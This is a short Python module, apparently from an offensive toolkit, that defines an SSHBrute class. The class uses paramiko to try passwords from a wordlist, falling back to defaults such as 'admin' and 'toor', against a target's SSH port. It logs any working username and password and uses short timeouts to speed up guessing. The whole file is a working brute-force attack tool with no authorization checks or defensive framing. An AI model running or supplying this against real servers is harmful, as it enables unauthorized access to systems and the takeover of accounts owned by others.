import paramiko
from core.colors import log_info, log_success, log_warning, log_danger

class SSHBrute:
    def __init__(self, target, username, wordlist_file="wordlists/passwords_top10k.txt"):
        self.target = target
        self.username = username
        self.wordlist_file = wordlist_file
        self.passwords = ["admin", "123456", "password", "root", "toor"]

    def load_words(self):
        try:
            with open(self.wordlist_file, 'r') as f:
                loaded = [line.strip() for line in f if line.strip()]
                if loaded:
                    self.passwords = loaded
        except FileNotFoundError:
            pass

    def brute_ssh(self):
        self.load_words()
        log_info(f"Starting SSH Brute Force on {self.target}:22 for user '{self.username}'...")
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for pwd in self.passwords:
            try:
                # Set a very short timeout to speed up brute forcing
                client.connect(self.target, port=22, username=self.username, password=pwd, timeout=2, banner_timeout=2)
                log_success(f"[+] SUCCESS! SSH Credentials found -> {self.username}:{pwd}")
                client.close()
                return True
            except paramiko.AuthenticationException:
                pass # Wrong password
            except Exception as e:
                # Connection dropped or port closed
                pass
            finally:
                client.close()
                
        log_warning("SSH Brute force failed. No valid passwords found.")
        return False

    def run(self):
        return self.brute_ssh()
